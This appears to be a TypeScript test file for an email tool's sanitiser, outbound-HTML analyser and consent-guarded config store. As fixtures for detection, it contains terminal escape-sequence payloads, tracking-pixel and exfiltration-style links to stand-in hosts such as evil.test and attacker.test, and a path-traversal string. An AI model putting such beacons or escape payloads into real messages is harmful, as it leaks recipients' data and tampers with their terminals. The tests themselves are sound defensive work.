import assert from 'node:assert/strict';
import { test } from 'node:test';
import { parseAddressList } from '../src/addresses.ts';
import {
  ConfigStore,
  classifyChange,
  configSchema,
  connectedAccounts,
  defaultInternalDomains,
  emptyConfig,
  findConnectedAccount,
  type InboxConfig,
  parseConfig,
} from '../src/config.ts';
import { CommsError, ERROR_REGISTRY } from '../src/errors.ts';
import { analyseOutboundHtml, sanitizeHtmlToText, sanitizePlainText } from '../src/sanitize.ts';
import { PUBLIC_MAILBOX_DOMAINS } from '../src/taint.ts';
import { tempDir } from './helpers/temp.ts';

const ESC = String.fromCharCode(0x1b);
const BEL = String.fromCharCode(0x07);
const CSI = String.fromCharCode(0x9b);
const CR = String.fromCharCode(0x0d);

function inbox(id: string, overrides: Partial<InboxConfig> = {}): InboxConfig {
  return {
    id,
    provider: 'gmail',
    email: 'jo@example.com',
    identity: 'oidc',
    sub: id,
    client: 'default',
    tier: 'organize',
    contacts: true,
    grantedScopes: [],
    secretRef: `gmail:refresh:${id}`,
    internalDomains: [],
    createdAt: '2026-09-18T00:00:00.000Z',
    ...overrides,
  };
}

test('every error code maps to a documented exit status', () => {
  const exits = new Set(Object.values(ERROR_REGISTRY).map((spec) => spec.exit));
  for (const exit of exits) assert.ok([1, 10, 64, 65, 66, 69, 75, 77, 78].includes(exit), `unexpected exit ${exit}`);
  assert.equal(new CommsError('POLICY_NEVER', 'x').exitCode, 10);
  assert.equal(new CommsError('KEYCHAIN_APPROVAL_PENDING', 'x').exitCode, 75);
  assert.equal(new CommsError('SCOPE_MISSING', 'x').exitCode, 77);
  assert.equal(new CommsError('RATE_CAPPED', 'x').retryable, true);
});

test('terminal control sequences in sender text are stripped, in plain and HTML bodies alike', () => {
  const hostile = `Hello${ESC}]52;c;ZXZpbA==${BEL} there${ESC}[2J${CSI}K and${CR}overwrite`;
  const plain = sanitizePlainText(hostile);
  assert.ok(![ESC, BEL, CSI, CR].some((c) => plain.text.includes(c)));
  assert.ok(plain.report.invisibleCharsRemoved >= 5);
  const html = sanitizeHtmlToText(`<p>${hostile}</p>`);
  assert.ok(![ESC, BEL, CSI, CR].some((c) => html.text.includes(c)));
});

test('the outbound analyser finds beacons, hidden text, forms and scripts that a text preview would hide', () => {
  const report = analyseOutboundHtml(
    '<p>Received, thanks.</p>' +
      '<img src="https://evil.test/p.gif?d=SECRET">' +
      '<div style="display:none">other thread contents</div>' +
      '<a href="https://attacker.test/c?d=BASE64">details</a>' +
      '<table background="https://t.test/bg.png"><tr><td style="background:url(https://t.test/cell.png)">x</td></tr></table>' +
      '<img srcset="https://t.test/a.png 1x, https://t.test/b.png 2x">' +
      '<form action="https://t.test/f"><input name="q"></form>' +
      '<span onclick="x()">y</span><style>.k{background:url(https://t.test/css.png)}</style>',
  );
  assert.deepEqual(report.remoteResources.sort(), [
    'https://evil.test/p.gif?d=SECRET',
    'https://t.test/a.png',
    'https://t.test/b.png',
    'https://t.test/bg.png',
    'https://t.test/cell.png',
    'https://t.test/css.png',
  ]);
  assert.ok(
    report.urls.some((u) => u.url === 'https://attacker.test/c?d=BASE64'),
    'full query strings are kept',
  );
  assert.ok(report.hidden.some((h) => h.text.includes('other thread contents')));
  assert.ok(report.forms + report.formFields >= 2);
  assert.ok(report.scripts >= 1);
  assert.match(report.visibleText, /Received, thanks\./);
  assert.ok(!report.visibleText.includes('other thread contents'));
});

test('a form and the fields inside it are counted as the different things they are', () => {
  // One number for both read as four forms in a message carrying one, and that number is shown to the person deciding
  // whether to trust the mail.
  const report = analyseOutboundHtml(
    '<form action="https://x.test/p"><input name="a"><input name="b"><button>Go</button></form><p>hi</p>',
  );
  assert.equal(report.forms, 1, 'one form, not four');
  assert.equal(report.formFields, 3);

  // A field outside a form still matters, and still is not a form.
  const loose = analyseOutboundHtml('<input name="a"><textarea></textarea>');
  assert.equal(loose.forms, 0);
  assert.equal(loose.formFields, 2);
});

test('HTML we render ourselves passes the analyser cleanly', () => {
  const report = analyseOutboundHtml(
    '<div dir="ltr"><p>Hi Sam,</p><p>See <a href="https://docs.example.com/x">the plan</a>.</p></div>',
  );
  assert.deepEqual(report.remoteResources, []);
  assert.deepEqual(report.hidden, []);
  assert.equal(report.forms, 0);
  assert.equal(report.formFields, 0);
  assert.equal(report.scripts, 0);
});

test('address lists: groups expanded, names kept, addresses canonical and de-duplicated', () => {
  assert.deepEqual(
    parseAddressList('"Doe, John" <John@Example.COM>, sam@partner.test, Team: a@b.test, JOHN@example.com;'),
    [
      { name: 'Doe, John', address: 'john@example.com' },
      { name: '', address: 'sam@partner.test' },
      { name: '', address: 'a@b.test' },
    ],
  );
  assert.deepEqual(parseAddressList(undefined), []);
  assert.deepEqual(parseAddressList('undisclosed-recipients:;'), []);
});

test('loosening a safety setting is refused without consent; tightening and consented loosening pass', async () => {
  const dir = tempDir();
  const store = new ConfigStore(dir);
  await store.update((c) => ({ ...c, inboxes: { work: inbox('ibx_AAAAAAAAAAAAAAAA', { sendPolicy: 'confirm' }) } }));

  await assert.rejects(
    store.update((c) => {
      const work = c.inboxes.work as InboxConfig;
      return { ...c, inboxes: { work: { ...work, sendPolicy: 'chat' } } };
    }),
    (e: unknown) =>
      e instanceof CommsError && e.code === 'LOOSENING_REFUSED' && /inboxes\.work\.sendPolicy/.test(e.message),
  );
  const loosenings: [string, (c: ReturnType<typeof emptyConfig>) => ReturnType<typeof emptyConfig>][] = [
    ['defaults.riskEscalation', (c) => ({ ...c, defaults: { ...c.defaults, riskEscalation: false } })],
    ['defaults.sendCaps', (c) => ({ ...c, defaults: { ...c.defaults, sendCaps: { perHour: 99, perDay: 100 } } })],
    ['defaults.attachRoots', (c) => ({ ...c, defaults: { ...c.defaults, attachRoots: ['~', '/'] } })],
    ['defaults.downloadsDir', (c) => ({ ...c, defaults: { ...c.defaults, downloadsDir: '/tmp/x' } })],
    [
      'defaults.confirm.elicitationClients',
      (c) => ({ ...c, defaults: { ...c.defaults, confirm: { elicitationClients: ['x'] } } }),
    ],
  ];
  for (const [path, change] of loosenings) {
    await assert.rejects(
      store.update(change),
      (e: unknown) => e instanceof CommsError && e.code === 'LOOSENING_REFUSED',
      path,
    );
    await store.update(change, { consent: { kind: 'loosening-consent', paths: [path] } });
  }
  // Tightening never needs consent.
  await store.update((c) => {
    const work = c.inboxes.work as InboxConfig;
    return { ...c, inboxes: { work: { ...work, sendPolicy: 'never' } } };
  });
  assert.equal((await store.load()).inboxes.work?.sendPolicy, 'never');
});

test('classifyChange: inheriting a looser default counts as loosening the inbox', () => {
  const before = emptyConfig();
  before.defaults.sendPolicy = 'confirm';
  before.inboxes.work = inbox('ibx_AAAAAAAAAAAAAAAA');
  const after = structuredClone(before);
  after.defaults.sendPolicy = 'chat';
  assert.deepEqual(classifyChange(before, after).loosened, ['inboxes.work.sendPolicy', 'defaults.sendPolicy']);
});

test('classifyChange: an inbox added with a looser policy than the default needs consent too', async () => {
  const before = emptyConfig();
  before.defaults.sendPolicy = 'never';
  const after = structuredClone(before);
  after.inboxes.work = inbox('ibx_AAAAAAAAAAAAAAAA', { sendPolicy: 'chat' });
  assert.deepEqual(classifyChange(before, after).loosened, ['inboxes.work.sendPolicy']);

  // Inheriting the default, or being stricter than it, is not a loosening.
  const inherits = structuredClone(before);
  inherits.inboxes.work = inbox('ibx_AAAAAAAAAAAAAAAA');
  assert.deepEqual(classifyChange(before, inherits).loosened, []);

  // Connecting a mailbox under the ordinary default must not demand a typed challenge.
  const ordinary = emptyConfig();
  const added = structuredClone(ordinary);
  added.inboxes.work = inbox('ibx_AAAAAAAAAAAAAAAA');
  assert.deepEqual(classifyChange(ordinary, added).loosened, []);
});

test('classifyChange: a path that climbs back out is not inside the directory it starts in', () => {
  // The bypass: `isInsideDirectory` compares by prefix, so without resolving `..` this reads as a move *into* the
  // downloads directory — and moving downloads somewhere world-readable would then need nobody's consent.
  const before = emptyConfig();
  before.defaults.downloadsDir = '/var/empty/downloads';
  const escaped = structuredClone(before);
  escaped.defaults.downloadsDir = '/var/empty/downloads/../../../tmp';
  assert.deepEqual(classifyChange(before, escaped).loosened, ['defaults.downloadsDir']);

  // A path that climbs out and back in again is genuinely inside it.
  const roundabout = structuredClone(before);
  roundabout.defaults.downloadsDir = '/var/empty/downloads/work/../work';
  assert.deepEqual(classifyChange(before, roundabout).loosened, []);
});

test('classifyChange: naming a file store where secrets already exist is the same downgrade', () => {
  // With no `secrets` block the effective store is the keychain, so this moves real secrets out of it.
  const before = emptyConfig();
  before.clients.default = {
    provider: 'gmail',
    clientId: 'x.apps.googleusercontent.com',
    secretRef: 'client:default',
    addedAt: new Date().toISOString(),
  };
  const toFiles = structuredClone(before);
  toFiles.secrets = { store: 'file' };
  assert.deepEqual(classifyChange(before, toFiles).loosened, ['secrets.store']);

  // On a configuration holding nothing yet, choosing a store is setup — and on a machine with no keychain it is the
  // only thing that works.
  const empty = emptyConfig();
  const chosen = structuredClone(empty);
  chosen.secrets = { store: 'file' };
  assert.deepEqual(classifyChange(empty, chosen).loosened, []);
});

test('classifyChange: narrowing the downloads directory is not a loosening', () => {
  const before = emptyConfig();
  before.defaults.downloadsDir = '/var/empty/downloads/mail';
  const narrower = structuredClone(before);
  narrower.defaults.downloadsDir = '/var/empty/downloads/mail/work';
  assert.deepEqual(classifyChange(before, narrower).loosened, [], 'a subdirectory of the same place');

  const elsewhere = structuredClone(before);
  elsewhere.defaults.downloadsDir = '/tmp/anywhere';
  assert.deepEqual(classifyChange(before, elsewhere).loosened, ['defaults.downloadsDir']);

  // `~` and the same path written out resolve to one place, so moving between the two spellings is not a change.
  const tilde = structuredClone(before);
  tilde.defaults.downloadsDir = '/var/empty/downloads/mail';
  assert.deepEqual(classifyChange(before, tilde).loosened, []);

  // A name that merely starts with the same characters is not inside it.
  const lookalike = structuredClone(before);
  lookalike.defaults.downloadsDir = '/var/empty/downloads/mail-elsewhere';
  assert.deepEqual(classifyChange(before, lookalike).loosened, ['defaults.downloadsDir']);

  // Clearing it returns to the built-in directory under our own state, which is the narrowest place there is.
  const cleared = structuredClone(before);
  delete cleared.defaults.downloadsDir;
  assert.deepEqual(classifyChange(before, cleared).loosened, []);

  // Naming one where none was named moves downloads out of that built-in directory, which does need consent.
  assert.deepEqual(classifyChange(cleared, before).loosened, ['defaults.downloadsDir']);
});

test('classifyChange: a new inbox may trust its own domain, but not somebody else’s', () => {
  const before = emptyConfig();
  const own = structuredClone(before);
  const row = inbox('ibx_AAAAAAAAAAAAAAAA');
  own.inboxes.work = { ...row, email: 'jo@company.test', internalDomains: ['company.test'] };
  assert.deepEqual(classifyChange(before, own).loosened, []);

  const other = structuredClone(before);
  other.inboxes.work = { ...row, email: 'jo@company.test', internalDomains: ['company.test', 'partner.test'] };
  assert.deepEqual(classifyChange(before, other).loosened, ['inboxes.work.internalDomains']);

  // Domains are case-insensitive: writing one in capitals is not a change of meaning, so it needs no consent.
  const shouted = structuredClone(before);
  shouted.inboxes.work = { ...row, email: 'Jo@Company.TEST', internalDomains: ['Company.TEST'] };
  assert.deepEqual(classifyChange(before, configSchema.parse(shouted)).loosened, []);
});

test('classifyChange: loosening the default policy counts even when there are no inboxes yet', async () => {
  const before = emptyConfig();
  before.defaults.sendPolicy = 'never';
  const after = structuredClone(before);
  after.defaults.sendPolicy = 'confirm';
  assert.deepEqual(classifyChange(before, after).loosened, ['defaults.sendPolicy']);
  assert.deepEqual(classifyChange(after, before).loosened, []);

  const store = new ConfigStore(tempDir());
  await store.update((c) => ({ ...c, defaults: { ...c.defaults, sendPolicy: 'confirm' } }));
  const toChat = (c: ReturnType<typeof emptyConfig>) => ({
    ...c,
    defaults: { ...c.defaults, sendPolicy: 'chat' as const },
  });
  await assert.rejects(
    store.update(toChat),
    (e: unknown) => e instanceof CommsError && e.code === 'LOOSENING_REFUSED' && /defaults\.sendPolicy/.test(e.message),
  );
  await store.update(toChat, { consent: { kind: 'loosening-consent', paths: ['defaults.sendPolicy'] } });
  assert.equal((await store.load()).defaults.sendPolicy, 'chat');
});

test('the schema reserves "all" and rejects duplicate inbox ids', () => {
  const dup = { version: 1, inboxes: { a: inbox('ibx_AAAAAAAAAAAAAAAA'), b: inbox('ibx_AAAAAAAAAAAAAAAA') } };
  assert.throws(() => parseConfig(JSON.stringify(dup)), /duplicates the id/);
  const reserved = { version: 1, inboxes: { all: inbox('ibx_AAAAAAAAAAAAAAAA') } };
  assert.throws(() => parseConfig(JSON.stringify(reserved)), /reserved/);
  assert.equal(emptyConfig().secrets, undefined, 'no secret backend until the first secret is stored');
});

test('default internal domains: the inbox domain, never a public mailbox provider', () => {
  assert.deepEqual(defaultInternalDomains('jo@example.com', PUBLIC_MAILBOX_DOMAINS), ['example.com']);
  assert.deepEqual(defaultInternalDomains('jo@gmail.com', PUBLIC_MAILBOX_DOMAINS), []);
});

test('config: a non-mail account sits beside the mailboxes rather than replacing them', () => {
  const config = parseConfig(
    JSON.stringify({
      version: 1,
      inboxes: { work: inboxFixture('ibx_AAAAAAAAAAAAAAAA') },
      accounts: { acme: accountFixture('acc_BBBBBBBBBBBBBBBB') },
    }),
  );

  assert.deepEqual(Object.keys(config.inboxes), ['work']);
  assert.deepEqual(Object.keys(config.accounts), ['acme']);
  assert.deepEqual(
    connectedAccounts(config).map((entry) => [entry.alias, entry.kind, entry.platform]),
    [
      ['acme', 'channel', 'slack'],
      ['work', 'mail', 'gmail'],
    ],
    'one list, sorted by alias: which map something lives in is the file’s business, not the reader’s',
  );
  assert.equal(findConnectedAccount(config, 'acme')?.id, 'acc_BBBBBBBBBBBBBBBB');
  assert.equal(findConnectedAccount(config, 'nothing'), null);
});

test('config: a config written before accounts existed reads as having none, not as invalid', () => {
  const config = parseConfig(JSON.stringify({ version: 1, inboxes: { work: inboxFixture('ibx_AAAAAAAAAAAAAAAA') } }));
  assert.deepEqual(config.accounts, {});
  assert.equal(connectedAccounts(config).length, 1);
});

test('config: one alias namespace across both maps, and ids unique across both', () => {
  const clash = () =>
    parseConfig(
      JSON.stringify({
        version: 1,
        inboxes: { work: inboxFixture('ibx_AAAAAAAAAAAAAAAA') },
        accounts: { work: accountFixture('acc_BBBBBBBBBBBBBBBB') },
      }),
    );
  // `--account work` cannot mean the mailbox in one command and the workspace in the next.
  assert.throws(clash, /already used in inboxes/);

  assert.throws(
    () =>
      parseConfig(
        JSON.stringify({
          version: 1,
          accounts: {
            acme: accountFixture('acc_BBBBBBBBBBBBBBBB'),
            other: accountFixture('acc_BBBBBBBBBBBBBBBB'),
          },
        }),
      ),
    /duplicates the id/,
  );
  assert.throws(
    () => parseConfig(JSON.stringify({ version: 1, accounts: { all: accountFixture('acc_BBBBBBBBBBBBBBBB') } })),
    /reserved/,
  );
});

test('config: a workspace is matched by id, never by the name it shows', () => {
  const before = parseConfig(
    JSON.stringify({
      version: 1,
      accounts: { acme: { ...accountFixture('acc_BBBBBBBBBBBBBBBB'), workspaceName: 'Acme Corp' } },
    }),
  );
  const renamed = parseConfig(
    JSON.stringify({
      version: 1,
      accounts: { acme: { ...accountFixture('acc_BBBBBBBBBBBBBBBB'), workspaceName: 'Acme Holdings' } },
    }),
  );
  // The display name changed; the thing it names did not.
  assert.equal(before.accounts.acme?.workspace, renamed.accounts.acme?.workspace);
  assert.notEqual(before.accounts.acme?.workspaceName, renamed.accounts.acme?.workspaceName);
});

function inboxFixture(id: string) {
  return {
    id,
    provider: 'gmail',
    identity: 'oidc',
    email: 'jo@example.com',
    client: 'desktop',
    tier: 'read',
    secretRef: 'r1',
    createdAt: '2026-09-20T00:00:00.000Z',
  };
}

function accountFixture(id: string) {
  return {
    id,
    platform: 'slack',
    workspace: 'T_ACME',
    userId: 'U_ME',
    tier: 'read',
    secretRef: 'r2',
    createdAt: '2026-09-20T00:00:00.000Z',
  };
}
